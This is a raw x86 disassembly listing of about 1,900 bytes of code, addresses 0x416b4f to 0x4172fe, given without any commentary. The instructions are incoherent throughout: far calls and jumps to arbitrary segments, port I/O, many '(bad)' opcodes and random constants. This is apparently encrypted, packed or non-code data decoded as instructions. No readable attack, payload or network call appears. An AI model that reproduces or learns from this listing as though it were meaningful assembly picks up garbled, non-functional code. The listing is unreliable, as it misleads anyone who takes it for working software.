  416b4f:	mov    ds:0x2c3f0b50,al
  416b54:	popa   
  416b55:	pop    edi
  416b56:	pusha  
  416b57:	mov    edi,0x3fe1c67a
  416b5c:	mov    dl,0x30
  416b5e:	aaa    
  416b5f:	xchg   esi,eax
  416b60:	push   es
  416b61:	jns    0x416bb1
  416b63:	adc    al,0x10
  416b65:	or     eax,DWORD PTR [ebp+0x98aee53]
  416b6b:	ins    BYTE PTR es:[edi],dx
  416b6c:	or     ah,BYTE PTR [eax]
  416b6e:	call   0x13f2:0x649a2edd
  416b75:	pop    ebp
  416b76:	push   ebx
  416b77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b78:	cmp    esp,DWORD PTR [eax+0x17]
  416b7b:	es int 0xd8
  416b7e:	in     eax,dx
  416b7f:	mov    eax,0xa77a3ffa
  416b84:	dec    edx
  416b85:	mov    ebp,0xe7850f0b
  416b8a:	jmp    0xaea1:0xd309faa7
  416b91:	std    
  416b92:	mov    dl,0x10
  416b94:	mov    bl,0xe
  416b96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b97:	pop    es
  416b98:	and    eax,0x4aaee4b9
  416b9d:	enter  0xa7bd,0x9c
  416ba1:	push   es
  416ba2:	in     eax,0x1e
  416ba4:	mov    bl,BYTE PTR [edx-0x34]
  416ba7:	push   es
  416ba8:	mov    dl,0x3d
  416baa:	into   
  416bab:	in     al,0x8
  416bad:	bnd jle 0x416b69
  416bb0:	pop    ebp
  416bb1:	or     ebp,DWORD PTR [edi]
  416bb3:	xlat   BYTE PTR ds:[ebx]
  416bb4:	dec    eax
  416bb5:	sub    bl,dl
  416bb7:	mov    BYTE PTR [edi+eax*4],al
  416bba:	xchg   DWORD PTR [edx+0x49],esi
  416bbd:	dec    edx
  416bbe:	adc    al,0xb1
  416bc0:	adc    al,BYTE PTR [ecx+ebp*8-0x39]
  416bc4:	shl    DWORD PTR [esi+esi*1+0x220becfb],cl
  416bcb:	jae    0x416c0c
  416bcd:	retf   
  416bce:	xchg   ebp,eax
  416bcf:	mov    al,0x5c
  416bd1:	or     eax,0xa5b2c9e0
  416bd6:	scas   eax,DWORD PTR es:[edi]
  416bd7:	push   esi
  416bd8:	jge    0x416c46
  416bda:	dec    ecx
  416bdb:	jbe    0x416c0a
  416bdd:	or     edx,DWORD PTR [eax+0x66]
  416be0:	push   ecx
  416be1:	jo     0x416b7a
  416be3:	push   ecx
  416be4:	pop    ebp
  416be5:	or     eax,0x850f59a2
  416bea:	xor    eax,edx
  416bec:	gs dec ebx
  416bee:	sbb    DWORD PTR [eax-0x52],0xdea70fda
  416bf5:	(bad)  
  416bf6:	jbe    0x416bc2
  416bf8:	out    dx,al
  416bf9:	ss xor al,0xed
  416bfc:	mov    dl,0x7d
  416bfe:	and    eax,0x764c220
  416c03:	inc    ebp
  416c04:	and    BYTE PTR ds:0xcb967967,al
  416c0a:	fmul   DWORD PTR [ebx+0x70fa0358]
  416c10:	aas    
  416c11:	inc    ebp
  416c12:	call   0xbed4:0xf3d88ba0
  416c19:	lock js 0x416bc3
  416c1c:	mov    al,ds:0x84d3c549
  416c21:	fs jno 0x416bad
  416c24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c25:	int3   
  416c26:	push   0xc833b282
  416c2b:	cmp    DWORD PTR gs:[eax],ebp
  416c2e:	out    dx,eax
  416c2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c30:	out    0x66,al
  416c32:	cmp    DWORD PTR [edi],ebp
  416c34:	adc    al,0x2a
  416c36:	mov    al,BYTE PTR [edi-0x54]
  416c39:	or     al,0x7b
  416c3b:	out    dx,al
  416c3c:	mov    dl,0x13
  416c3e:	cmp    ebp,0xa7f84d12
  416c44:	mov    eax,ds:0xd2c2bdb6
  416c49:	fwait
  416c4a:	pop    edx
  416c4b:	push   0xffffffb4
  416c4d:	cmp    dh,BYTE PTR [ebx+edi*8-0x23]
  416c51:	in     eax,dx
  416c52:	sbb    ch,dl
  416c54:	pop    edi
  416c55:	or     esp,DWORD PTR [eax+0x3b]
  416c58:	xor    cl,BYTE PTR [eax-0x16a88751]
  416c5e:	call   0x4ded:0xcb588a8
  416c65:	jge    0x416c6c
  416c67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c68:	lea    ebx,[ebx+edx*4]
  416c6b:	and    DWORD PTR [edi],ebp
  416c6d:	sar    ah,cl
  416c6f:	in     al,dx
  416c70:	mov    dl,0x27
  416c72:	dec    eax
  416c73:	retf   0x387a
  416c76:	stc    
  416c77:	ja     0x416c3b
  416c79:	or     esi,DWORD PTR [edx-0x49]
  416c7c:	fwait
  416c7d:	pop    ebx
  416c7e:	cmpxchg cl,ch
  416c81:	scas   al,BYTE PTR es:[edi]
  416c82:	call   0xf759:0xfb6168e0
  416c89:	mov    ch,0xd5
  416c8b:	push   edx
  416c8c:	push   esi
  416c8d:	add    esp,0x9eaf4a7
  416c93:	(bad)  
  416c95:	jg     0x416c54
  416c97:	stos   BYTE PTR es:[edi],al
  416c98:	mov    dl,0x70
  416c9a:	add    al,BYTE PTR [ebp+0x73a781]
  416ca0:	and    eax,0x88a4ea7c
  416ca5:	and    eax,0x4d320ff4
  416caa:	jno    0x416c4d
  416cac:	imul   eax,DWORD PTR [edx+edx*2-0x652ef9e1],0xb9c27c40
  416cb7:	add    DWORD PTR [edi+0x4ab9aaca],edx
  416cbd:	popa   
  416cbe:	jl     0x416c81
  416cc0:	mov    edx,0x5d2260b
  416cc5:	mov    al,0x83
  416cc7:	mov    edx,0x333ab1b2
  416ccc:	jecxz  0x416cdd
  416cce:	(bad)  
  416ccf:	lock movhps QWORD PTR [ecx+eiz*4+0x34],xmm0
  416cd5:	retf   
  416cd6:	dec    BYTE PTR [esi]
  416cd8:	add    bl,bh
  416cda:	stc    
  416cdb:	mov    ecx,0xb12ef6b2
  416ce0:	push   ecx
  416ce1:	(bad)  
  416ce2:	nop
  416ce3:	inc    ebp
  416ce4:	inc    ebp
  416ce5:	or     al,0xb1
  416ce7:	jle    0x416c89
  416ce9:	neg    eax
  416ceb:	mul    DWORD PTR [ebx+0x30]
  416cee:	(bad)  
  416cf0:	mov    dl,0xd5
  416cf2:	loop   0x416d28
  416cf4:	mov    ecx,0xbeb2aa88
  416cf9:	imul   dl
  416cfb:	inc    edi
  416cfc:	or     DWORD PTR [ebx],0xfffffff6
  416cff:	or     ah,BYTE PTR [eax]
  416d01:	test   al,0xec
  416d03:	scas   al,BYTE PTR es:[edi]
  416d04:	sub    al,bh
  416d06:	call   0xb73b:0xc71814a9
  416d0d:	pop    ebp
  416d0e:	stc    
  416d0f:	push   ebp
  416d10:	ror    BYTE PTR [ebx],cl
  416d12:	std    
  416d13:	out    dx,eax
  416d14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d15:	xchg   esp,eax
  416d16:	aas    
  416d17:	cwde   
  416d18:	loop   0x416d0c
  416d1a:	in     al,dx
  416d1b:	xchg   esp,eax
  416d1c:	mov    dl,0xd4
  416d1e:	pop    ecx
  416d1f:	in     al,0x78
  416d21:	dec    edx
  416d22:	xchg   DWORD PTR [eax+0x7e],eax
  416d25:	add    al,BYTE PTR [ebx+0x655cd554]
  416d2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d2c:	inc    edx
  416d2d:	and    ebp,DWORD PTR [edx]
  416d2f:	cdq    
  416d30:	enter  0x3d0b,0x81
  416d34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d35:	out    dx,al
  416d36:	xor    BYTE PTR [eax-0x71],al
  416d39:	or     BYTE PTR [edx-0x267a14cc],bl
  416d3f:	sbb    bh,BYTE PTR [ebx-0x27]
  416d42:	inc    edi
  416d43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d44:	retf   0x6009
  416d47:	dec    ecx
  416d48:	mov    dh,0xd3
  416d4a:	rol    DWORD PTR [edi-0x3f34454e],cl
  416d50:	inc    ebx
  416d51:	fdiv   st(4),st
  416d53:	xchg   esi,eax
  416d54:	lahf   
  416d55:	or     edx,DWORD PTR [edx+0x1691befa]
  416d5b:	outs   dx,BYTE PTR ds:[esi]
  416d5c:	das    
  416d5d:	inc    ebx
  416d5e:	call   0xd53:0xf9f574a9
  416d65:	call   0xbd95:0x1cfca7e1
  416d6c:	test   ah,bl
  416d6e:	xor    eax,esi
  416d70:	mov    dl,0xdd
  416d72:	jbe    0x416dcf
  416d74:	xchg   esi,eax
  416d75:	jge    0x416d7a
  416d77:	in     al,0x54
  416d79:	or     BYTE PTR [ecx],dl
  416d7b:	and    BYTE PTR [edx+0x56],cl
  416d7e:	(bad)  
  416d7f:	sub    BYTE PTR [edx+0x16],ch
  416d82:	or     cl,al
  416d84:	iret   
  416d85:	pop    esp
  416d86:	jmp    0x416d87
  416d88:	mov    dl,0xd2
  416d8a:	push   ecx
  416d8b:	gs mov eax,0xab75ea4c
  416d91:	or     esp,esi
  416d93:	jmp    0x416db2
  416d95:	imul   BYTE PTR [esi+ebx*8]
  416d98:	sar    ah,0x9b
  416d9b:	xor    dh,BYTE PTR [edx*1+0x386416a1]
  416da2:	push   edx
  416da3:	fstp   QWORD PTR [ebx+0x35]
  416da6:	mov    al,ds:0xe84232f8
  416dab:	mov    WORD PTR [ebx+edx*1],ds
  416dae:	mov    edi,0xe240ac00
  416db3:	jnp    0x416d67
  416db5:	xchg   BYTE PTR ds:0x44b17e5,dh
  416dbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416dbc:	add    DWORD PTR [esi+0x62],ebp
  416dbf:	cwde   
  416dc0:	cli    
  416dc1:	sub    BYTE PTR [edx],ch
  416dc3:	or     eax,0xc4b03eb2
  416dc8:	mov    ecx,0xaf884ccf
  416dcd:	or     edx,esi
  416dcf:	sub    ch,BYTE PTR [esi+0x38]
  416dd2:	push   cs
  416dd3:	pop    ecx
  416dd4:	jne    0x416da0
  416dd6:	xchg   esp,eax
  416dd7:	inc    edi
  416dd8:	and    eax,0x71676706
  416ddd:	test   BYTE PTR [edi],bh
  416ddf:	stc    
  416de0:	mov    al,ds:0xa67be80b
  416de5:	jp     0x416d87
  416de7:	cld    
  416de8:	out    0x3e,al
  416dea:	xchg   esp,eax
  416deb:	jae    0x416da9
  416ded:	dec    edx
  416dee:	pop    ecx
  416def:	inc    edi
  416df0:	imul   eax,esp,0xe
  416df3:	stc    
  416df4:	mov    ebp,0x98a59c0b
  416df9:	sub    esi,DWORD PTR [edi+0x40]
  416dfc:	sub    edx,DWORD PTR [edx]
  416dfe:	call   0x1e27:0xe638401e
  416e05:	mov    ecx,edi
  416e07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e08:	or     eax,0xde2c5988
  416e0d:	push   esp
  416e0e:	or     DWORD PTR [ebx+esi*4+0x4],edx
  416e12:	push   0x70
  416e14:	push   ebx
  416e15:	test   BYTE PTR [ebx+ecx*1-0x58618696],dl
  416e1c:	xor    ch,BYTE PTR [edi+edx*1-0x1d9e6e37]
  416e23:	fsubr  DWORD PTR [edx]
  416e25:	inc    eax
  416e26:	out    0xb6,al
  416e28:	mov    dl,0xba
  416e2a:	sub    DWORD PTR ds:0x31d4b0fa,0x60173359
  416e34:	mov    dl,0xd6
  416e36:	push   edx
  416e37:	lods   eax,DWORD PTR ds:[esi]
  416e38:	div    BYTE PTR ds:0x21c8f3a0
  416e3e:	call   0xa6c2:0x56189be0
  416e45:	inc    ebx
  416e46:	mov    esp,DWORD PTR [ebp-0xabe9a56]
  416e4c:	hlt    
  416e4d:	sahf   
  416e4e:	jp     0x416e64
  416e50:	sahf   
  416e51:	push   cs
  416e52:	cdq    
  416e53:	sahf   
  416e54:	sub    eax,0x7c6a7851
  416e59:	sbb    DWORD PTR ds:0x8a0b43a5,0xffffff96
  416e60:	out    0xce,al
  416e62:	jg     0x416edd
  416e64:	push   DWORD PTR [ebx-0xc033a66]
  416e6a:	out    dx,al
  416e6b:	adc    DWORD PTR [ecx-0xb],esp
  416e6e:	call   0x89b8ca1a
  416e73:	xchg   BYTE PTR [ebx],bh
  416e75:	les    edx,FWORD PTR [ebp-0x3c174adc]
  416e7b:	sbb    dl,BYTE PTR [edx-0x5]
  416e7e:	or     eax,0x467ad271
  416e83:	stc    
  416e84:	mov    dh,0x73
  416e86:	cmp    esp,DWORD PTR [edi+0x44cc537a]
  416e8c:	push   ebx
  416e8d:	dec    ebp
  416e8e:	pop    eax
  416e8f:	sbb    eax,0xd01f31b9
  416e94:	sbb    al,0xb
  416e96:	loopne 0x416e51
  416e98:	repz arpl bx,cx
  416e9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e9c:	mov    ?,WORD PTR [ebp+0x62]
  416e9f:	and    al,0x9f
  416ea1:	in     al,0xa0
  416ea3:	cli    
  416ea4:	mov    cl,0x16
  416ea6:	push   ecx
  416ea7:	dec    edx
  416ea8:	bound  esi,QWORD PTR [eax+0x71482f6f]
  416eae:	or     ebx,edx
  416eb0:	mov    edx,0x5858410b
  416eb5:	test   DWORD PTR [ebx-0x658c348c],edi
  416ebb:	xchg   esi,eax
  416ebc:	and    al,0xa0
  416ebe:	dec    ebp
  416ebf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ec0:	push   es
  416ec1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ec2:	mov    ecx,0x52e774bb
  416ec7:	out    0x8b,eax
  416ec9:	cs daa 
  416ecb:	and    esp,ecx
  416ecd:	dec    eax
  416ece:	call   0xa87b:0xbd103f90
  416ed5:	push   esp
  416ed6:	in     al,dx
  416ed7:	mov    ebx,0x2e316f91
  416edc:	mov    esp,0xf5311a06
  416ee1:	mov    DWORD PTR [esi+0x18],ebx
  416ee4:	mov    dl,0x97
  416ee6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ee7:	adc    eax,0x6d1df07b
  416eec:	pop    es
  416eed:	jg     0x416f03
  416eef:	dec    ebx
  416ef0:	or     DWORD PTR [ebx],0xffffff93
  416ef3:	push   esi
  416ef4:	add    eax,0x29476ee1
  416ef9:	les    ebx,FWORD PTR [edx-0x4060c1f4]
  416eff:	pusha  
  416f00:	xchg   ecx,eax
  416f01:	mov    cl,0xb6
  416f03:	mov    al,ds:0x6f4cc10e
  416f08:	inc    edx
  416f09:	sbb    ah,ah
  416f0b:	mov    ah,0x5a
  416f0d:	adc    ecx,DWORD PTR [edi]
  416f0f:	in     al,dx
  416f10:	mov    al,0x29
  416f12:	loop   0x416f24
  416f14:	(bad)  
  416f16:	jecxz  0x416edf
  416f18:	nop
  416f19:	fst    QWORD PTR [eax-0x59]
  416f1c:	dec    eax
  416f1d:	cmp    DWORD PTR [ebp+eiz*1+0x71],ebp
  416f21:	inc    esp
  416f22:	dec    ebx
  416f23:	xchg   ebx,eax
  416f24:	mov    ebp,0xf636b630
  416f29:	retf   
  416f2a:	jmp    esp
  416f2c:	sbb    DWORD PTR [ecx],eax
  416f2e:	adc    esp,0x2bea09f7
  416f34:	fsubr  QWORD PTR [edx+0x4a]
  416f37:	inc    edi
  416f38:	jb     0x416f7d
  416f3a:	xchg   esi,eax
  416f3b:	je     0x416eef
  416f3d:	ins    DWORD PTR es:[edi],dx
  416f3e:	test   al,0xd6
  416f40:	lds    edx,FWORD PTR [esi+0x5d]
  416f43:	push   0xffffff96
  416f45:	or     esp,DWORD PTR [ecx]
  416f47:	mov    ebp,0x7b09c1e8
  416f4c:	nop
  416f4d:	sbb    DWORD PTR [edx-0x2a466498],ebx
  416f53:	pushf  
  416f54:	loopne 0x416ef4
  416f56:	and    BYTE PTR [edi-0x2074fb93],ah
  416f5c:	ficomp DWORD PTR [edi-0x105f6dc]
  416f62:	and    eax,0x70c87ca7
  416f67:	aam    0x21
  416f69:	mov    bl,0xf7
  416f6b:	mov    eax,0xe7dd5f46
  416f70:	aaa    
  416f71:	(bad)  
  416f72:	aam    0x2c
  416f74:	retf   0x9af8
  416f77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f78:	ds jb  0x416f33
  416f7b:	jg     0x416fb7
  416f7d:	push   esi
  416f7e:	pop    esi
  416f7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f80:	jmp    0x416f12
  416f82:	jne    0x416fb4
  416f84:	ins    DWORD PTR es:[edi],dx
  416f85:	xchg   esp,eax
  416f86:	fcmovbe st,st(6)
  416f88:	mov    dh,0xb2
  416f8a:	mov    BYTE PTR ds:[edx+0x1ad35a66],al
  416f91:	call   0x224a1748
  416f96:	or     al,0x8f
  416f99:	rcl    DWORD PTR [eax+0x6942e2d1],1
  416f9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416fa0:	mov    dl,0x63
  416fa2:	jle    0x416f4e
  416fa4:	inc    ebp
  416fa5:	cli    
  416fa6:	cwde   
  416fa7:	cmp    BYTE PTR ds:0xba60b10b,ah
  416fad:	popf   
  416fae:	cdq    
  416faf:	repz jbe 0x416f8e
  416fb2:	sub    dh,dl
  416fb4:	(bad)  
  416fb5:	sti    
  416fb6:	and    DWORD PTR [edi-0x3e79790b],esp
  416fbc:	je     0x416fb1
  416fbe:	xor    eax,0x199f72a7
  416fc3:	sbb    dl,BYTE PTR [eax-0x4f9c77e0]
  416fc9:	es aas 
  416fcb:	push   ebp
  416fcc:	push   esp
  416fcd:	test   al,0x17
  416fcf:	inc    edi
  416fd0:	hlt    
  416fd1:	dec    ebx
  416fd2:	mov    eax,ds:0x4446a3a4
  416fd7:	add    DWORD PTR [edi+edx*8-0x4c],0x9a68663d
  416fdf:	daa    
  416fe0:	xchg   ebp,eax
  416fe1:	mov    ebx,0x17901efa
  416fe6:	push   ds
  416fe7:	stc    
  416fe8:	inc    edx
  416fe9:	or     al,0xae
  416feb:	test   eax,0xd0df6b73
  416ff0:	cmp    al,0x27
  416ff2:	call   0x7f9f:0xea5a301
  416ff9:	cwde   
  416ffa:	pop    esp
  416ffb:	mov    edx,0x2722432a
  417000:	das    
  417001:	cmp    edx,DWORD PTR [esi]
  417003:	mov    ecx,0x82935fbb
  417008:	xor    dh,BYTE PTR [esi+0x47c2a7c6]
  41700e:	cmp    eax,0xdd0b6c40
  417013:	xchg   edi,eax
  417014:	sbb    eax,0xce5b08ed
  417019:	mov    ebp,0x29510a9a
  41701e:	inc    edi
  41701f:	dec    edi
  417020:	(bad)  
  417022:	add    BYTE PTR [edi-0x558c7cfe],ah
  417028:	repnz idiv DWORD PTR [eax+0x19]
  41702c:	(bad)  
  41702d:	leave  
  41702e:	cdq    
  41702f:	push   esi
  417030:	sub    ch,BYTE PTR [esi-0x1c6c5087]
  417036:	cwde   
  417037:	push   ebp
  417038:	mov    eax,0x2271060a
  41703d:	std    
  41703e:	cmp    DWORD PTR [esi],ecx
  417040:	pop    es
  417041:	ret    
  417042:	xchg   esi,eax
  417043:	inc    ecx
  417044:	mov    dl,0xf3
  417046:	(bad)  
  417047:	pop    ebp
  417048:	rcl    DWORD PTR [ecx+0xba428f9],cl
  41704e:	or     DWORD PTR [esi+0x71],esi
  417051:	out    dx,al
  417052:	pop    ss
  417053:	pop    edx
  417054:	enter  0x9f77,0x9a
  417058:	jp     0x417030
  41705a:	sbb    eax,0x3ac03518
  41705f:	jle    0x41703b
  417061:	(bad)  
  417062:	jg     0x41700b
  417064:	or     DWORD PTR [ebp+0x6],ecx
  417067:	ret    0xefe7
  41706a:	mov    eax,0xcccbb09c
  41706f:	int    0x67
  417071:	imul   esp,DWORD PTR [esi+0x72],0x52
  417075:	cs pushf 
  417077:	setne  BYTE PTR [edx]
  41707a:	nop
  41707b:	ja     0x4170fb
  41707d:	or     DWORD PTR [eax+0x11256bae],eax
  417083:	(bad)  
  417084:	in     eax,0x8
  417086:	lods   eax,DWORD PTR ds:[esi]
  417087:	inc    eax
  417088:	mov    ebp,0x98e57fc3
  41708d:	or     DWORD PTR [esi+0x17],ecx
  417090:	sub    ebx,esp
  417092:	mov    ds:0x613c7286,eax
  417097:	push   0xffffff88
  417099:	(bad)  
  41709a:	sti    
  41709b:	mov    ds:0x33d6e4ee,eax
  4170a0:	jb     0x4170ee
  4170a2:	jp     0x4170d8
  4170a4:	or     BYTE PTR [ebx],0xa
  4170a7:	inc    edx
  4170a8:	inc    edi
  4170a9:	repz cli 
  4170ab:	add    edi,DWORD PTR [esi]
  4170ad:	pop    esi
  4170ae:	call   0x8733:0xb21b86b4
  4170b5:	nop
  4170b6:	fsub   QWORD PTR [ebp+0x1c044cc1]
  4170bc:	in     eax,dx
  4170bd:	cmp    BYTE PTR [edx-0x61],bh
  4170c0:	ret    
  4170c1:	mov    eax,0x9f9b159a
  4170c6:	das    
  4170c7:	cmc    
  4170c8:	je     0x41712d
  4170ca:	pop    esi
  4170cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4170cc:	dec    BYTE PTR [ecx]
  4170ce:	cmp    al,0xcd
  4170d0:	lahf   
  4170d1:	cwde   
  4170d2:	popa   
  4170d3:	pop    ss
  4170d4:	mov    ebp,0x31663956
  4170d9:	jmp    0x4170ea
  4170db:	add    ah,BYTE PTR [ebx]
  4170dd:	xchg   DWORD PTR [ebp+0x5f],esp
  4170e0:	xchg   edi,eax
  4170e1:	or     ebx,eax
  4170e3:	dec    ebp
  4170e4:	(bad)  
  4170e5:	in     eax,0x54
  4170e7:	adc    al,0x61
  4170e9:	adc    dl,BYTE PTR [esi+eax*2+0x3a1730fa]
  4170f0:	cld    
  4170f1:	pop    esi
  4170f2:	mov    edi,0x420084e7
  4170f7:	dec    ecx
  4170f8:	push   esi
  4170f9:	or     ecx,DWORD PTR [ebx*8+0x6314c065]
  417100:	cli    
  417101:	lea    ebx,[ecx+0x53193f40]
  417107:	std    
  417108:	ds ret 
  41710a:	shl    esi,0xee
  41710d:	jb     0x417122
  41710f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417110:	dec    ebx
  417111:	sbb    ebx,DWORD PTR [eax+ebx*2-0x10e8d682]
  417118:	mov    ebx,0xde24a5ab
  41711d:	mov    gs,ecx
  41711f:	sub    esi,DWORD PTR [edx-0x2ea4416a]
  417125:	xor    BYTE PTR [ecx],ch
  417127:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417128:	add    eax,0x148ab97e
  41712d:	shl    BYTE PTR [edi],0x30
  417130:	mov    dl,0x8a
  417132:	sbb    eax,0xac9434ee
  417137:	std    
  417138:	cwde   
  417139:	daa    
  41713a:	mov    ch,0x5f
  41713c:	adc    DWORD PTR [ebx],ecx
  41713e:	mov    dl,BYTE PTR ds:0x8220114e
  417144:	mov    bl,0xb2
  417146:	iret   
  417147:	mov    edx,0x278b918e
  41714c:	inc    esi
  41714d:	xor    eax,ebx
  41714f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417150:	dec    ebp
  417151:	inc    edi
  417152:	pmaddwd mm7,QWORD PTR [ebx+0x39]
  417156:	cmc    
  417157:	bound  eax,QWORD PTR ds:0x310fe58b
  41715d:	aas    
  41715e:	xchg   BYTE PTR [edi+0x7f],dl
  417161:	or     eax,DWORD PTR [esi-0x41]
  417164:	add    BYTE PTR [edx-0x1fdfe77f],cl
  41716a:	call   0x722b:0xff28c964
  417171:	ret    
  417172:	dec    edi
  417173:	test   eax,0x8da8f729
  417178:	xlat   BYTE PTR ds:[ebx]
  417179:	dec    ebp
  41717a:	sbb    DWORD PTR [ebx],ebx
  41717c:	out    dx,al
  41717d:	or     bl,BYTE PTR [ebx]
  41717f:	bound  edi,QWORD PTR [eax+eax*8+0x11]
  417183:	fwait
  417184:	ret    0x8a22
  417187:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417188:	fucomp st(1)
  41718a:	xlat   BYTE PTR ds:[ebx]
  41718b:	gs retf 0x2aa1
  41718f:	jnp    0x417143
  417191:	out    0xed,eax
  417193:	ss (bad) 
  417195:	out    dx,al
  417196:	inc    ebp
  417197:	push   ss
  417198:	ja     0x4171cb
  41719a:	mov    DWORD PTR fs:[edi],esi
  41719d:	add    ch,BYTE PTR ds:[ebp+0x375a0bf3]
  4171a4:	jo     0x41713b
  4171a6:	mov    ds:0x6b0fbde4,al
  4171ab:	pop    edi
  4171ac:	or     BYTE PTR [ebx-0x16],0x93
  4171b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4171b1:	dec    ebp
  4171b2:	cdq    
  4171b3:	fnstsw WORD PTR [eax+0x7715fe0c]
  4171b9:	xchg   edi,eax
  4171ba:	in     eax,0x76
  4171bc:	mov    esp,0xfc979851
  4171c1:	jle    0x41715e
  4171c3:	in     eax,0x18
  4171c5:	int3   
  4171c6:	loope  0x4171e8
  4171c8:	pop    es
  4171c9:	fwait
  4171ca:	jb     0x417241
  4171cc:	sbb    bh,BYTE PTR [ebx-0x5e]
  4171cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4171d0:	xchg   edx,eax
  4171d1:	(bad)  
  4171d2:	push   ss
  4171d3:	and    ecx,DWORD PTR [edx-0x1f]
  4171d6:	fwait
  4171d7:	pop    ss
  4171d8:	mov    dl,0x1c
  4171da:	fimul  DWORD PTR [edx]
  4171dc:	sub    al,0xe6
  4171de:	lock push ds
  4171e0:	std    
  4171e1:	or     ecx,DWORD PTR [edx]
  4171e3:	mov    esi,0x7acf7285
  4171e8:	outs   dx,BYTE PTR ds:[esi]
  4171e9:	scas   al,BYTE PTR es:[edi]
  4171ea:	call   0x755c:0x516d2fa6
  4171f1:	popa   
  4171f2:	mov    WORD PTR [edi-0x7383e761],fs
  4171f8:	jbe    0x41721d
  4171fa:	lds    esp,FWORD PTR [eax]
  4171fc:	mov    dl,0x63
  4171fe:	xchg   ecx,eax
  4171ff:	pop    ss
  417200:	inc    esi
  417201:	mov    al,ds:0xab61be3d
  417206:	push   ebp
  417207:	jo     0x417258
  417209:	or     eax,DWORD PTR [edx-0x46af3e40]
  41720f:	and    al,0x94
  417211:	mov    esi,0x179ed784
  417216:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  417218:	xchg   esi,edi
  41721a:	pop    es
  41721b:	or     bl,BYTE PTR [edi+0x6a]
  41721e:	aas    
  41721f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417220:	sub    eax,0xbe5504c2
  417225:	add    edi,edx
  417227:	pop    ds
  417228:	fcom   st(3)
  41722a:	call   0xe682:0xea3d0d2e
  417231:	xchg   edx,eax
  417232:	outs   dx,BYTE PTR ds:[esi]
  417233:	mov    al,ds:0xbc572c00
  417238:	aam    0xbb
  41723a:	fldenv [edi+0x70]
  41723d:	pop    eax
  41723e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41723f:	mov    eax,0x9af20b33
  417244:	retf   0x551a
  417247:	stc    
  417248:	test   eax,0x42cca305
  41724d:	fst    st(4)
  41724f:	mov    esi,DWORD PTR [edx-0xe8af4c8]
  417255:	inc    ebp
  417256:	call   0xa640:0xd1bb3c95
  41725d:	mov    eax,ds:0x88e59ab2
  417262:	call   0xd47d:0x9e11951b
  417269:	scas   eax,DWORD PTR es:[edi]
  41726a:	xchg   al,ah
  41726c:	mov    ebp,0xe4129b92
  417271:	(bad)  
  417272:	pushf  
  417273:	and    eax,0xa76c987e
  417278:	in     eax,dx
  417279:	xlat   BYTE PTR ds:[ebx]
  41727a:	mov    dh,0xe2
  41727c:	lods   eax,DWORD PTR ds:[esi]
  41727d:	dec    ecx
  41727e:	mov    ds:0xa200cae0,al
  417283:	inc    edx
  417284:	xchg   edi,eax
  417285:	test   BYTE PTR ds:0xfa2b44f6,cl
  41728b:	adc    DWORD PTR [ecx-0x33],ebx
  41728e:	lahf   
  41728f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417290:	xchg   ebx,eax
  417291:	aad    0xff
  417293:	sbb    dh,BYTE PTR [ecx+0x2]
  417296:	mov    ds,edx
  417298:	mov    dl,0x7f
  41729a:	sti    
  41729b:	adc    eax,0x9c812d11
  4172a0:	popa   
  4172a1:	or     ebp,DWORD PTR [edx-0x49599ad2]
  4172a7:	stos   DWORD PTR es:[edi],eax
  4172a8:	sbb    BYTE PTR ds:0x8d8fa59a,ah
  4172ae:	and    al,0x18
  4172b0:	xchg   esi,eax
  4172b1:	shl    BYTE PTR [ecx-0x41181e67],cl
  4172b7:	test   eax,0x99dc0b75
  4172bc:	pop    ebp
  4172bd:	xchg   edx,eax
  4172be:	hlt    
  4172bf:	push   esi
  4172c0:	mov    dl,0xc7
  4172c2:	xchg   edx,eax
  4172c3:	es scas eax,DWORD PTR es:[edi]
  4172c5:	sbb    al,0x41
  4172c7:	sti    
  4172c8:	xchg   DWORD PTR [esp+edx*1],edx
  4172cb:	sbb    BYTE PTR [ebx-0x75],ch
  4172ce:	xlat   BYTE PTR ds:[ebx]
  4172cf:	loop   0x417334
  4172d1:	jecxz  0x4172f5
  4172d3:	jg     0x41728a
  4172d5:	and    esi,DWORD PTR [ecx+edi*2+0x1b]
  4172d9:	adc    edi,DWORD PTR [edx+0x74]
  4172dc:	vsubss xmm4,xmm2,DWORD PTR [esi+0x70805c0c]
  4172e4:	cmp    al,bh
  4172e6:	sbb    eax,0x2aa3f265
  4172eb:	mov    ah,0xb3
  4172ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172ee:	push   esp
  4172f0:	xor    BYTE PTR [esi],ch
  4172f2:	dec    edi
  4172f3:	das    
  4172f4:	push   edx
  4172f5:	sbb    eax,0xa485a09d
  4172fa:	ja     0x41735a
  4172fc:	sbb    DWORD PTR [ebx],edi
  4172fe:	add    DWORD PTR [ebp-0x30],edi
